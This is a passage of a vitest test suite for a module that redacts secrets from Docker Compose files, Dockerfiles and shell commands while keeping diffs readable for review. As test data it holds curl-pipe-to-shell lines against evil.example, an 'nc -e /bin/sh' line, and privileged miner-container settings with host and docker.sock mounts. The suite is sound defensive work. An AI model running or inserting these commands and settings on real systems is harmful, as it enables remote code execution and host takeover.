import { describe, it, expect } from 'vitest';
import { redactCommandLine, redactDocument, redactDocumentLines } from '../src/client/redact.js';
import { formatRedactedDiff } from '../src/client/compose.js';
import { documentSecrets, sanitizeServerMessage } from '../src/client/base.js';

/**
 * Fourth adversarial review: what the round-3 rewrite broke, and what it hid that it should show.
 * Two kinds of test, on purpose: a secret must not be printed, AND an ordinary file must stay
 * readable — an agent reviews an image bump or a diff with this output.
 */
const S = 's3cr3t-AAAA1111bbbb2222';
const doc = (...lines: string[]): string => lines.join('\n');
const hides = (out: string, secret = S): void => { expect(out).not.toContain(secret); };
const unchanged = (text: string): void => { expect(redactDocument(text)).toBe(text); };

describe('a key is a NAME when it sits directly under a top-level section', () => {
  it('a service called test / command / entrypoint is a service: its environment is redacted', () => {
    for (const name of ['test', 'command', 'entrypoint']) {
      const out = redactDocument(doc('services:', `  ${name}:`, '    image: nginx:1.27', '    environment:', `      POSTGRES_PASSWORD: ${S}`, '    ports:', '      - "80:80"'));
      hides(out);
      expect(out).toContain('image: nginx:1.27');
      expect(out).toContain('- "80:80"');
    }
  });

  it('a service called env / args / environment is not a block of variables', () => {
    for (const name of ['env', 'args', 'environment']) {
      unchanged(doc('services:', `  ${name}:`, '    image: nginx:1.27', '    volumes:', '      - /var/run/docker.sock:/var/run/docker.sock'));
    }
  });

  it('`test:` with a mapping under it is a key like any other', () => {
    hides(redactDocument(doc('    test:', '      environment:', `        DB_PASSWORD: ${S}`)));
    unchanged(doc('    healthcheck:', '      test:', '        - CMD', '        - curl', '        - -f', '        - http://localhost:3000/health', '      interval: 10s'));
  });
});

describe('command lists', () => {
  it('the script body of a `- |` item is ordinary text: its key rules apply', () => {
    const out = redactDocument(doc('    command:', '      - sh', '      - -c', '      - |', '        cat > /app/config.yml <<EOF', `        password: ${S}`, '        EOF', '    image: x'));
    hides(out);
    expect(out).toContain('cat > /app/config.yml <<EOF');
    expect(out).toContain('image: x');
  });

  it('an item is ONE argument: a value with blanks is hidden to its end', () => {
    expect(redactDocument(doc('    command:', '      - redis-server', `      - --requirepass=correct horse ${S}`)))
      .toBe(doc('    command:', '      - redis-server', '      - --requirepass=[REDACTED]'));
    hides(redactDocument(doc('    command:', '      - redis-server', '      - --requirepass', `      - correct horse ${S}`)));
    hides(redactDocument(`      test: ["CMD", "redis-server", "--requirepass=correct horse ${S}"]`));
    hides(redactDocument(`    command: [prog, --requirepass, ${S.replace('-', ' ')} tail]`), 'AAAA1111bbbb2222');
    // …and one that holds a whole command line is still read word by word.
    hides(redactDocument(doc('    command:', `      - redis-server --requirepass ${S}`)));
  });

  it('ordinary arguments stay readable: name=value items, -e, set -e', () => {
    unchanged(doc('    command:', '      - postgres', '      - -c', '      - shared_buffers=256MB', '      - -c', '      - wal_level=replica', '      - -c', '      - config_file=/etc/postgresql/postgresql.conf'));
    unchanged('    command: ["/bin/sh", "-e", "/entrypoint.sh"]');
    unchanged('    entrypoint: sh -c "set -e && npx prisma migrate deploy && node server.js"');
    expect(redactCommandLine("sed -i -e 's/a/b/' file")).toBe("sed -i -e 's/a/b/' file");
    expect(redactCommandLine("mysql -e 'select 1'")).toBe("mysql -e 'select 1'");
    expect(redactCommandLine('nc -e /bin/sh host 80')).toBe('nc -e /bin/sh host 80');
    // docker's -e still sets a variable, whatever the case of its name.
    expect(redactCommandLine(`docker run -e lower=${S} img`)).toBe('docker run -e lower=[REDACTED] img');
  });

  it('a flow list in prettier style, at the indent of its key, with a comment in it', () => {
    hides(redactDocument(doc('    command: [', '    "redis-server",', '    "--requirepass",', `    "${S}"`, '    ]', '    image: x')));
    const commented = redactDocument(doc('    command: ["redis-server",', '      "--requirepass", # see [1]', `      "${S}"]`, '    image: x'));
    hides(commented);
    expect(commented).toContain('image: x');
  });

  it('redis-cli -aSECRET as a list element, and the value of a flag given as a block scalar', () => {
    hides(redactDocument(`      test: ["CMD", "redis-cli", "-a${S}", "ping"]`));
    hides(redactDocument(doc('      test:', '        - CMD', '        - redis-cli', `        - -a${S}`, '        - ping')));
    hides(redactDocument(doc('    command:', '      - --requirepass', '      - |', `        ${S}`, '    image: x')));
  });
});

describe('command substitutions and glued quotes', () => {
  it('$(…) and backticks are commands of their own', () => {
    expect(redactDocument(`      test: ["CMD-SHELL", "[ $$(redis-cli -a ${S} ping) = PONG ]"]`))
      .toBe('      test: ["CMD-SHELL", "[ $$(redis-cli -a [REDACTED] ping) = PONG ]"]');
    hides(redactCommandLine(`until $(mysqladmin ping --password ${S} --silent); do sleep 1; done`));
    hides(redactCommandLine(`echo \`mysqladmin ping --password ${S}\``));
    hides(redactCommandLine(`echo $(prog --requirepass "s3cr3t)AAAA1111")`), 'AAAA1111');
    expect(redactCommandLine('echo $(date +%s) && ls $(pwd)')).toBe('echo $(date +%s) && ls $(pwd)');
  });

  it('a deeply nested, harmless entrypoint stays readable', () => {
    unchanged(`    entrypoint: bash -c 'eval "echo \\"$$(cat ~/temp.yml)\\"" > ~/kong.yml && /docker-entrypoint.sh kong docker-start'`);
  });

  it('quoted parts glued by the shell are read part by part, a flag carried from one to the next', () => {
    hides(redactCommandLine(`sh -c 'prog '\\''--requirepass=${S}'\\'''`));
    hides(redactCommandLine(`sh -c 'redis-cli -a '\\''${S}'\\'' ping'`));
    hides(redactCommandLine(`sh -c 'redis-cli -a '"'"'${S}'"'"' ping'`));
    hides(redactCommandLine(`curl -H"X-Api-Key: ${S}" http://h`));
  });

  it('a quoted header before a shell operator', () => {
    for (const tail of ['; echo done', '|jq .', '||exit 1', '&& true', ')']) hides(redactCommandLine(`curl -H "X-Api-Key: ${S}"${tail}`));
    hides(redactCommandLine(`curl -sS '--header' 'X-Api-Key: ${S}'|jq .`));
  });

  it('a Bearer header in escaped quotes keeps the rest of the command — a new `| sh` must stay visible', () => {
    const out = redactDocument('    command: sh -c "curl -fsS -H \\"Authorization: Bearer $$API_TOKEN\\" https://evil.example/install.sh | sh"');
    expect(out).toContain('https://evil.example/install.sh | sh"');
    hides(redactDocument(`    command: sh -c "curl -H \\"Authorization: Bearer ${S}\\" https://x"`));
  });

  it('a string in escaped quotes glued to a word, and XML around one', () => {
    hides(redactCommandLine(`sh -c "grep a\\"b f && mysql --password ${S} -e x && grep c\\"d f"`));
    hides(redactCommandLine(`sh -c "x=\\"redis-cli -a ${S} ping\\"; $x"`));
    hides(redactDocument(`  <password>"${S} x"</password>`));
  });

  it('a backslash-newline inside one command string continues the line', () => {
    const out = redactCommandLine(`redis-server --requirepass \\\n  ${S}`);
    hides(out);
    expect(out).toContain('\\\n');
  });

  it('separators and prefixes that are not the value', () => {
    hides(redactCommandLine(`prog --password := ${S}`));
    hides(redactCommandLine(`prog --password: ${S}`));
    hides(redactCommandLine(`export PASSWORD = ${S}`));
    hides(redactCommandLine(`sudo lower=${S} app`));
    hides(redactCommandLine(`exec env -i lower=${S} app`));
    hides(redactCommandLine(`set -e; export Lower_Name=${S}; app`));
    hides(redactCommandLine(`lower+=${S} app`));
  });
});

describe('PEM blocks', () => {
  it('a key in a quoted scalar whose lines sit at column 0', () => {
    const out = redactDocument(doc('      JWT_KEY: "-----BEGIN PRIVATE KEY-----', 'MIIEs3cr3tAAAA1111', 'abcd+/EFGH==', '-----END PRIVATE KEY-----"', '      NEXT: 1'));
    hides(out, 'MIIEs3cr3tAAAA1111');
    hides(out, 'abcd+/EFGH');
    expect(out).toContain('NEXT: 1');
  });

  it('header lines of a key block (PGP, encrypted PEM) belong to it', () => {
    const out = redactDocument(doc('      -----BEGIN PGP PRIVATE KEY BLOCK-----', '      Comment: x', '      Version: 2', '', '      lQOYs3cr3tAAAA1111', '      -----END PGP PRIVATE KEY BLOCK-----', '    image: x'));
    hides(out, 'lQOYs3cr3tAAAA1111');
    hides(out, 'Comment: x');
    expect(out).toContain('image: x');
  });

  it('a marker in a comment hides only the comment lines after it', () => {
    const before = doc('FROM node:24', '# -----BEGIN NOTES-----', '# keep this image small', 'RUN npm ci');
    const after = doc('FROM node:24', '# -----BEGIN NOTES-----', '# keep this image small', 'RUN npm ci', 'RUN curl -s https://evil.example/x.sh | sh', 'USER root');
    const diff = formatRedactedDiff(before, after).join('\n');
    expect(diff).toContain('evil.example/x.sh | sh');
    expect(diff).toContain('USER root');
  });

  it('a marker that is only text ends at the first line that is not base64', () => {
    const out = redactDocument(doc('    labels:', '      - "note=-----BEGIN NOTE-----"', '      - "other=1"', '    privileged: true'));
    expect(out).toContain('- "other=1"');
    expect(out).toContain('privileged: true');
  });
});

describe('what a diff must show', () => {
  it('an env item holding a lone quote does not hide the lines after it', () => {
    const base = ['services:', '  app:', '    image: nginx:1', '    environment:', '      - MOTD="', '      - API_KEY=x'];
    const added = ['    privileged: true', '    network_mode: host', '    cap_add:', '      - SYS_ADMIN', '    volumes:', '      - /var/run/docker.sock:/var/run/docker.sock', '      - /:/host'];
    const diff = formatRedactedDiff(base.join('\n'), [...base, ...added].join('\n')).join('\n');
    for (const line of ['privileged: true', 'network_mode: host', 'SYS_ADMIN', '/var/run/docker.sock:/var/run/docker.sock', '/:/host']) expect(diff, line).toContain(line);
  });

  it('flow-style volumes, devices and security options are shown', () => {
    unchanged('    volumes: ["/var/run/docker.sock:/var/run/docker.sock", "data:/data"]');
    unchanged('    security_opt: ["no-new-privileges:true"]');
    unchanged('    extra_hosts: ["host.docker.internal:host-gateway"]');
  });

  it('a hunk too large to align shows only what changed, and survives 70 000 lines a side', { timeout: 120_000 }, () => {
    const a = Array.from({ length: 2100 }, (_, i) => `    line${i}: v`);
    const b = [...a];
    b[10] = '    image: nginx:2';
    b[1050] = '    privileged: true';
    b[2090] = '    user: root';
    // Make the differing middle too large for the table: 2080 × 2080 > 4M cells.
    const diff = formatRedactedDiff(a.join('\n'), b.join('\n'));
    expect(diff.filter((l) => l.startsWith('~'))).toHaveLength(0);
    expect(diff.filter((l) => l.startsWith('+')).map((l) => l.trim())).toEqual(['+     image: nginx:2', '+     privileged: true', '+     user: root']);
    const big = Array.from({ length: 70_000 }, (_, i) => `a${i}`).join('\n');
    const other = Array.from({ length: 70_000 }, (_, i) => `b${i}`).join('\n');
    expect(() => formatRedactedDiff(big, other)).not.toThrow();
  });
});

describe('ordinary files stay readable', () => {
  it('an upper-case key with a nested mapping does not force its children', () => {
    unchanged(doc('http:', '  routers:', '    API:', '      rule: Host(`api.example.com`)', '      service: api'));
    unchanged(doc('    networks:', '      DMZ:', '        aliases:', '          - web'));
  });

  it('a Dockerfile syntax directive, and comments that hold no secret', () => {
    unchanged('# syntax=docker/dockerfile:1.7');
    unchanged(doc('FROM node:24-alpine AS build', '# install only production dependencies', 'RUN npm ci --omit=dev', 'ENTRYPOINT ["node", "server.js"]'));
  });

  it('a whole compose of the usual kind', () => {
    unchanged(doc(
      'services:',
      '  app:',
      '    image: ghcr.io/acme/app:1.2.3',
      '    build:',
      '      context: .',
      '      dockerfile: Dockerfile',
      '      target: runtime',
      '    command: ["node", "server.js", "--port", "3000"]',
      '    depends_on: [db, cache]',
      '    labels:',
      '      - traefik.enable=true',
      '      - "traefik.http.routers.app.rule=Host(`app.example.com`)"',
      '      - traefik.http.services.app.loadbalancer.server.port=3000',
      '    healthcheck:',
      '      test: ["CMD-SHELL", "wget -qO- http://localhost:3000/health || exit 1"]',
      '      interval: 10s',
      '    deploy:',
      '      resources:',
      '        limits:',
      '          memory: 512M',
      '  db:',
      '    image: postgres:16',
      '    command: postgres -c shared_buffers=256MB -c max_connections=200',
      '    volumes:',
      '      - pgdata:/var/lib/postgresql/data',
      'volumes:',
      '  pgdata:',
    ));
  });
});

describe('sensitive keys: lists at the key\'s indent, comments after the key', () => {
  it('a list at the indent of a sensitive key loses its items', () => {
    hides(redactDocument(doc('api_keys:', `- ${S}`, '- hunter2password', 'name: web')));
    expect(redactDocument(doc('api_keys:', `- ${S}`, 'name: web'))).toContain('name: web');
  });

  it('a comment after a key that opens a block is redacted like any comment', () => {
    hides(redactDocument(doc(`    command: # redis-server --requirepass ${S}`, '      - redis-server')));
    hides(redactDocument(doc(`    API_KEY: # ${S}`, '    image: x')));
    hides(redactDocument(doc(`    API_KEY: | # ${S}`, '      x', '    image: x')));
    hides(redactDocument(doc(`    environment: # was ${S}`, '      - A=b')));
    unchanged(doc('    command: # the server', '      - redis-server'));
  });

  it('a Dockerfile continuation survives CRLF, blank lines and comments inside it', () => {
    hides(redactDocument(`RUN redis-server --requirepass \\\r\n    ${S}\r\nRUN echo done\r\n`));
    hides(redactDocument(doc('RUN redis-server --requirepass \\', '# the password', `    ${S}`)));
    expect(redactDocumentLines(`RUN a \\\r\n    b\r\n`)).toHaveLength(3);
  });
});

describe('server messages', () => {
  it('secrets are removed before the message is cut: a compose echoed whole is itself a secret', () => {
    const compose = JSON.stringify({ services: { db: { image: 'postgres:16', environment: { POSTGRES_PASSWORD: S, PAD: 'x'.repeat(9000) } } } });
    const out = sanitizeServerMessage(`The docker compose raw field is invalid: ${compose}`, documentSecrets(compose));
    hides(out);
    expect(out).toContain('The docker compose raw field is invalid');
  });

  it('a cut through a secret leaves no beginning of it behind', () => {
    const token = `12|${S}${'z'.repeat(40)}`;
    for (const pad of [63_990, 63_999, 64_000, 64_010]) {
      const out = sanitizeServerMessage(`${' '.repeat(pad)}${token} rejected`, [token]);
      expect(out, String(pad)).not.toContain('12|s3cr3t');
    }
  });
});

/** Fifth pass: what the round-4 fixes themselves got wrong. */
describe('fifth pass', () => {
  const Q = "'"; // a single quote, to keep the shell idioms below readable
  const BS = '\\';

  it('a marker that names key material but is only text hides nothing after it', () => {
    const base = ['services:', '  app:', '    image: nginx:1'];
    const added = ['    x-note: -----BEGIN PRIVATE KEY-----', '    image: evil/miner:latest', '    privileged: true', '    pid: host', '    user: root', '    command: sh -c "curl https://evil.example/x.sh | sh"'];
    const diff = formatRedactedDiff(base.join('\n'), [...base.slice(0, 2), ...added].join('\n')).join('\n');
    for (const line of ['evil/miner:latest', 'privileged: true', 'pid: host', 'user: root', 'evil.example/x.sh | sh']) expect(diff, line).toContain(line);
    // Real armor headers still belong to the block.
    hides(redactDocument(doc('  -----BEGIN RSA PRIVATE KEY-----', '  Proc-Type: 4,ENCRYPTED', '  DEK-Info: AES-256-CBC,ABCDEF', '', '  MIIEs3cr3tAAAA1111', '  -----END RSA PRIVATE KEY-----')), 'MIIEs3cr3tAAAA1111');
  });

  it('a quoted part glued after a waiting flag IS its value, blanks included', () => {
    const glue = `${Q}${BS}${Q}${Q}`; // '\''
    const idiom = `${Q}"${Q}"${Q}`; // '"'"'
    hides(redactCommandLine(`sh -c ${Q}curl -H ${glue}X-Api-Key: ${S}${glue} http://h${Q}`));
    hides(redactCommandLine(`sh -c ${Q}curl -H ${idiom}X-Api-Key: ${S}${idiom} http://h${Q}`));
    hides(redactCommandLine(`sh -c ${Q}prog --password ${glue}correct horse ${S}${glue}${Q}`));
    const harmless = `sh -c ${Q}curl -H ${glue}Accept: application/json${glue} http://h${Q}`;
    expect(redactCommandLine(harmless)).toBe(harmless);
  });

  it('a substitution inside double quotes keeps its own quotes', () => {
    hides(redactCommandLine(`echo "$(prog --requirepass "${S}")"`));
    hides(redactCommandLine(`X="$(curl -s -H "X-Api-Key: ${S}" http://h)"`));
    hides(redactDocument(`      test: ["CMD-SHELL", "[ ${BS}"$$(redis-cli -a ${BS}"${S}${BS}" ping)${BS}" = PONG ]"]`));
    const harmless = 'echo "$(date "+%Y-%m-%d")" && echo "done"';
    expect(redactCommandLine(harmless)).toBe(harmless);
  });

  it('the lines that continue an inline command are readable command text', () => {
    unchanged(doc('    command: bash -c "', '      python manage.py migrate &&', '      gunicorn app.wsgi --bind 0.0.0.0:8000', '      "', '    image: x'));
    unchanged(doc('    command: redis-server', '      --appendonly yes', '    image: redis:7'));
    unchanged(doc('      test: curl -f http://localhost:3000/health', '        || exit 1', '      interval: 10s'));
    // …and a flag on one line with its value on the next is still hidden.
    const out = redactDocument(doc('    command: redis-server --requirepass', `      ${S}`, '      --appendonly yes', '    image: redis:7'));
    hides(out);
    expect(out).toContain('--appendonly yes');
    expect(out).toContain('image: redis:7');
    const diff = formatRedactedDiff(doc('    command: bash -c "', '      app"'), doc('    command: bash -c "', '      curl -fsSL https://evil.example/x.sh | sh &&', '      app"')).join('\n');
    expect(diff).toContain('evil.example/x.sh | sh');
  });

  it('a quote inside a plain flow element does not leave the list open', () => {
    const out = redactDocument(doc('    post_start:', `      - command: [sh, -c, echo it${Q}s up]`, '        environment:', `          lower: ${S}`, '    image: x'));
    hides(out);
    expect(out).toContain(`echo it${Q}s up]`);
    unchanged('    command: [echo, 5" disk, ok]');
  });

  it('an anchor or a tag after an upper-case or sensitive-looking key is not a value', () => {
    unchanged(doc('services:', '  DB: &db', '    image: postgres:16', '    restart: always'));
    unchanged(doc('services:', '  passbolt: &p', '    image: passbolt/passbolt:latest'));
    hides(redactDocument(doc('x-credentials: &c', `  password: ${S}`)));
  });

  it('a header glued to its flag and to what follows', () => {
    for (const tail of [';echo', '|jq .', '&&x']) {
      hides(redactCommandLine(`curl -H"X-Api-Key: ${S}"${tail}`));
      hides(redactCommandLine(`curl --header="X-Api-Key: ${S}"${tail}`));
    }
    expect(redactCommandLine('curl -H"Accept: text/plain";echo ok')).toBe('curl -H"Accept: text/plain";echo ok');
  });

  it('a long server message is cut where no secret is split', () => {
    const token = `12|${S}${'z'.repeat(40)}`;
    for (const pad of [63_900, 63_920, 63_960, 63_999, 64_000]) {
      const out = sanitizeServerMessage(`${' '.repeat(pad)}${token}${'y'.repeat(300)}`, [token]);
      expect(out, String(pad)).not.toContain('12|s3cr3t');
    }
    const compose = JSON.stringify({ services: { db: { environment: { POSTGRES_PASSWORD: S, PAD: 'x'.repeat(40_000) } } } });
    hides(sanitizeServerMessage(`invalid: ${compose} ${'t'.repeat(30_000)}`, documentSecrets(compose)));
    hides(sanitizeServerMessage(`invalid: ${'p'.repeat(60_000)}${compose}`, documentSecrets(compose)));
  });
});

/** Sixth pass: the continuation of a command, and key blocks inside quotes. */
describe('sixth pass', () => {
  const KEY = 'MIIEs3cr3tAAAA1111bbbb2222';

  it('a key block written out by a continued command is hidden; the command goes on after it', () => {
    const out = redactDocument(doc(
      '    command: "sh -c \'printf %b \\"\\',
      '      -----BEGIN PRIVATE KEY-----\\n\\',
      `      ${KEY}\\n\\`,
      '      -----END PRIVATE KEY-----\\" > /run/key.pem && exec app\'"',
      '    image: x',
    ));
    hides(out, KEY);
    expect(out).toContain('image: x');
    hides(redactDocument(doc("    entrypoint: sh -c 'echo \"", '      -----BEGIN OPENSSH PRIVATE KEY-----', `      ${KEY}`, '      -----END OPENSSH PRIVATE KEY-----" > /k && exec app\'')), KEY);
  });

  it('a `password: …` line written out by a continued command loses its value', () => {
    const out = redactDocument(doc('    command: "sh -c \'printf \\"user: admin\\n', `      password: ${S}\\n\\" > /etc/app.yml && exec app'"`, '    image: x'));
    hides(out);
    expect(out).toContain('user: admin');
    expect(out).toContain('image: x');
  });

  it('a flag at the end of a line inside a quote left open waits for the next line', () => {
    hides(redactDocument(doc('    command: "redis-server --appendonly yes --requirepass', `      ${S}"`, '    image: redis:7')));
    hides(redactDocument(doc('    command: sh -c "redis-server --requirepass', `      ${S} --appendonly yes"`)));
    unchanged(doc('    command: "redis-server --appendonly', '      yes --save 60 1"', '    image: redis:7'));
  });

  it('a key block in a quoted scalar is hidden to the closing quote, header lines and under-indented lines included', () => {
    const pgp = redactDocument(doc('    environment:', '      GPG_KEY: "', '-----BEGIN PGP PRIVATE KEY BLOCK-----', 'Version: GnuPG v2', '', KEY, '-----END PGP PRIVATE KEY BLOCK-----"', '    image: x'));
    hides(pgp, KEY);
    hides(pgp, 'GnuPG');
    expect(pgp).toContain('image: x');
    const rsa = redactDocument(doc('      SSH_KEY: "key follows', '      -----BEGIN RSA PRIVATE KEY-----', '      Proc-Type: 4,ENCRYPTED', '      DEK-Info: AES-256-CBC,ABCD', '', `      ${KEY}`, '      -----END RSA PRIVATE KEY-----"', '    image: x'));
    hides(rsa, KEY);
    expect(rsa).toContain('image: x');
  });

  it('an under-indented multi-line quoted value is the value to its closing quote', () => {
    const out = redactDocument(doc('    environment:', '      MOTD: "Hello', `login: ${S}`, `then ${S}`, 'bye"', '      PORT: 3000'));
    hides(out);
    expect(out).toContain('PORT: 3000');
  });

  it('a marker alone on a line under a key hides nothing left of it', () => {
    const base = ['services:', '  app:', '    image: nginx:1.27'];
    const added = ['    x-note:', '      -----BEGIN PRIVATE KEY-----', '    image: evil/miner:latest', '    privileged: true', '    pid: host', '    user: root', '    command: sh -c "curl http://evil/x | sh"'];
    const diff = formatRedactedDiff(base.join('\n'), [...base.slice(0, 2), ...added].join('\n')).join('\n');
    for (const line of ['evil/miner:latest', 'privileged: true', 'pid: host', 'user: root', 'curl http://evil/x | sh']) expect(diff, line).toContain(line);
  });

  it('armor headers are not counted: a block with many of them stays hidden', () => {
    const headers = Array.from({ length: 9 }, (_, i) => `      Comment: line ${i}`);
    hides(redactDocument(doc('    key: |', '      -----BEGIN PGP PRIVATE KEY BLOCK-----', ...headers, '', `      ${KEY}`, '      -----END PGP PRIVATE KEY BLOCK-----')), KEY);
  });
});

/** Seventh pass: a marker that is a list item or a flow element, and very long blocks. */
describe('seventh pass', () => {
  const KEY = 'MIIEs3cr3tAAAA1111bbbb2222';
  const base = doc('services:', '  app:', '    image: nginx:1.27', '    restart: always');
  const EVIL = ['image: evil/miner:latest', 'privileged: true', 'pid: host', '/var/run/docker.sock:/var/run/docker.sock'];
  const shows = (after: string): void => {
    const diff = formatRedactedDiff(base, after).join('\n');
    for (const line of EVIL) expect(diff, line).toContain(line);
  };
  const rest = ['    image: evil/miner:latest', '    privileged: true', '    pid: host', '    volumes:', '    - /var/run/docker.sock:/var/run/docker.sock'];

  it('a marker as an item of a list written at its key\'s indent hides nothing after the list', () => {
    shows(doc('services:', '  app:', '    labels:', '    - -----BEGIN X-----', ...rest, '    # -----END X-----', '    restart: always'));
    shows(doc('services:', '  app:', '    command:', '    - "-----BEGIN X-----"', ...rest, '    x-end: -----END X-----'));
    // A later real certificate is not the end of that item either.
    shows(doc('services:', '  app:', '    dns_search:', '    - -----BEGIN X-----', ...rest, 'configs:', '  ca:', '    content: |', '      -----BEGIN CERTIFICATE-----', '      MIIDdzCCAl+gAwIBAgIEAgAAuTANBgkq', '      -----END CERTIFICATE-----'));
    shows(doc('x-notes:', '- -----BEGIN X-----', 'services:', '  app:', ...rest, '# -----END X-----'));
  });

  it('sibling items after a marker item stay readable', () => {
    const out = redactDocument(doc('    labels:', '      - -----BEGIN X-----', '      - traefik.enable=true', '      - traefik.http.routers.app.rule=Host(`a.example.com`)', '      - -----END X-----'));
    expect(out).toContain('traefik.enable=true');
    expect(out).toContain('Host(`a.example.com`)');
  });

  it('a marker as a key of a mapping hides no sibling key', () => {
    const out = redactDocument(doc('    labels:', '      -----BEGIN X-----: note', '      traefik.enable: "true"', '    privileged: true', '    # -----END X-----'));
    expect(out).toContain('traefik.enable: "true"');
    expect(out).toContain('privileged: true');
  });

  it('a marker as an element of a flow list ends with the list', () => {
    shows(doc('services:', '  app:', '    x-notes: [', '    -----BEGIN X-----', '    ]', ...rest, '    # -----END X-----'));
    shows(doc('services:', '  app:', '    x-notes: [ a,', '    -----BEGIN X-----, b ]', ...rest, '    # -----END X-----'));
    shows(doc('x-notes: [', '-----BEGIN X-----', 'more text ]', 'services:', '  app:', ...rest, '# -----END X-----'));
  });

  it('a real block as a list item, at either indent, is still hidden whole', () => {
    for (const dash of ['    - ', '  - ']) {
      const out = redactDocument(doc('  certs:', `${dash}-----BEGIN PRIVATE KEY-----`, `      Comment: ${S}`, `      ${KEY}`, '      -----END PRIVATE KEY-----', `${dash}other`));
      hides(out);
      hides(out, KEY);
      expect(out).toContain('other');
    }
    hides(redactDocument(doc('{', '  "cert": [', '    "-----BEGIN PRIVATE KEY-----",', `    "${KEY}",`, '    "-----END PRIVATE KEY-----"', '  ]', '}')), KEY);
  });

  it('a bracket inside a block is a character of the block', () => {
    const out = redactDocument(doc('  k: |', '    -----BEGIN PGP PRIVATE KEY BLOCK-----', `    Comment: mine } ${S}`, '', `    ${KEY}`, '    -----END PGP PRIVATE KEY BLOCK-----', '  image: x'));
    hides(out);
    hides(out, KEY);
    expect(out).toContain('image: x');
    hides(redactDocument(doc('-----BEGIN PGP PRIVATE KEY BLOCK-----', `Comment: see ] ${S}`, '', KEY, '-----END PGP PRIVATE KEY BLOCK-----')));
  });

  it('a very long block stays hidden to its end', () => {
    const body = Array.from({ length: 450 }, (_, i) => `${KEY}${String(i).padStart(4, '0')}`);
    const out = redactDocument(doc('-----BEGIN PRIVATE KEY-----', ...body, '-----END PRIVATE KEY-----', 'OTHER_SETTING=1'));
    hides(out, KEY);
    expect(out).toContain('OTHER_SETTING=');
    const nested = redactDocument(doc('x-thing:', '  cert: |', '    -----BEGIN PRIVATE KEY-----', ...body.map((l) => `    ${l}`), '    -----END PRIVATE KEY-----', 'x-other: plain'));
    hides(nested, KEY);
    expect(nested).toContain('x-other: plain');
  });
});

describe('seventh pass: long blocks written with escaped line breaks', () => {
  const KEY = 'MIIEs3cr3tAAAA1111bbbb2222';
  const body = (indent: string): string[] => Array.from({ length: 450 }, (_, i) => `${indent}${KEY}${String(i).padStart(4, '0')}\\n\\`);

  it('in a quoted value under a key that says nothing', () => {
    const out = redactDocument(doc('  cert: "x', '    -----BEGIN PRIVATE KEY-----\\n\\', ...body('    '), '    -----END PRIVATE KEY-----"', '  image: x'));
    hides(out, KEY);
    expect(out).toContain('image: x');
  });

  it('written out by a continued command', () => {
    const out = redactDocument(doc('    command: "sh -c \'printf %b \\"\\', '      -----BEGIN PRIVATE KEY-----\\n\\', ...body('      '), '      -----END PRIVATE KEY-----\\" > /k\'"', '    image: x'));
    hides(out, KEY);
    expect(out).toContain('image: x');
  });
});

/**
 * Eighth pass. A marker hides only what a key block is made of — base64 lines and the armor
 * headers — never "everything up to an END marker": YAML lets quoted scalars and flow collections
 * sit at any indent, so nothing about a marker line proves that the lines after it are text.
 */
describe('eighth pass: a marker never hides the rest of a service', () => {
  const base = doc('services:', '  app:', '    image: nginx:1.27', '    restart: always');
  const EVIL = ['image: evil/miner:latest', 'privileged: true', 'pid: host', '/var/run/docker.sock:/var/run/docker.sock'];
  const rest = ['    image: evil/miner:latest', '    privileged: true', '    pid: host', '    volumes:', '    - /var/run/docker.sock:/var/run/docker.sock'];
  const shows = (after: string): void => {
    const diff = formatRedactedDiff(base, after).join('\n');
    for (const line of EVIL) expect(diff, line).toContain(line);
  };
  const LINE = 'MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7VJTUt9Us8cKjMzEf';

  it('in a flow collection written at its key\'s indent, or left of it', () => {
    shows(doc('services:', '  app:', '    x-notes: [', '    # first', '    -----BEGIN X-----', '    ]', ...rest, '    # -----END X-----'));
    shows(doc('services:', '  app:', '    x-notes: [ a', '    , b', '    -----BEGIN X-----', '    ]', ...rest, '    # -----END X-----'));
    shows(doc('services:', '  app:', '    x-notes: [', '    -----BEGIN X-----,', '    "[" ]', ...rest, '    # -----END X-----'));
    shows(doc('services:', '  app:', '    x-notes: [', '    -----BEGIN X-----, # [', '    b ]', ...rest, '    # -----END X-----'));
    shows(doc('services:', '  app:', '    x-notes: { a:', '    -----BEGIN X-----', '    }', ...rest, '    # -----END X-----'));
    shows(doc('services:', '  app:', '    x-notes: {', '    -----BEGIN X-----,', '    a: b }', ...rest, '    x-end: note', '      AAAA', '      -----END X-----'));
    shows(doc('services:', '  app:', '    x-notes: [', '  k: -----BEGIN X-----,', '    a ]', ...rest, '    # -----END X-----'));
  });

  it('after a quoted scalar whose lines are not indented', () => {
    shows(doc('services:', '  app:', '    x-note: "text', '  k: -----BEGIN X-----"', ...rest, '    x-end: "a', '    -----END X-----"'));
    shows(doc('services:', '  app:', '    x-note: "text', '  fake: |', '    -----BEGIN X-----"', ...rest, '    x-end: "a', '    -----END X-----"'));
    shows(doc('services:', '  app:', '    x-note: "text', '    -----BEGIN X-----"', ...rest, '    x-end: note', '      AAAA', '      -----END X-----'));
  });

  it('as the value of a key of a list item: the other keys of the item are shown', () => {
    const diff = formatRedactedDiff(base, doc('services:', '  app:', '    image: nginx:1.27', '    restart: always', '    volumes:', '      - x-note: -----BEGIN X-----', '        type: bind', '        source: /var/run/docker.sock', '        target: /var/run/docker.sock', '        # -----END X-----')).join('\n');
    expect(diff).toContain('type: bind');
    expect(diff).toContain('source: /var/run/docker.sock');
    expect(diff).toContain('target: /var/run/docker.sock');
  });

  it('in a script: the lines between two markers are shown', () => {
    const out = redactDocument(doc('configs:', '  init:', '    content: |', '      cat <<EOF', '      -----BEGIN X-----', '      EOF', '      curl http://evil.example/x | sh', '      cat <<EOF', '      -----END X-----', '      EOF'));
    expect(out).toContain('curl http://evil.example/x | sh');
  });

  it('in a trailing comment: only comment lines can belong to it', () => {
    const out = redactDocument(doc('    cap_add: [ # -----BEGIN X-----', '      ALL', '    ]', '    devices: [ # -----BEGIN X-----', '      "/dev/sda",', '      /dev/kmsg', '    ]', '    restart: always'));
    for (const line of ['ALL', '"/dev/sda",', '/dev/kmsg', 'restart: always']) expect(out, line).toContain(line);
  });

  it('a header no key block has is shown; the key after it is not', () => {
    const out = redactDocument(doc('  cert: |', '    -----BEGIN PRIVATE KEY-----', '    X-Note: rotated in March', `    ${LINE}`, `    ${LINE.slice(10)}`, '    AAAA1111bbbb2222==', '    -----END PRIVATE KEY-----', '  image: x'));
    expect(out).toContain('X-Note: rotated in March');
    hides(out, LINE);
    hides(out, LINE.slice(10));
    hides(out, 'AAAA1111bbbb2222==');
    expect(out).toContain('image: x');
  });

  it('a short word after such a line is not key material', () => {
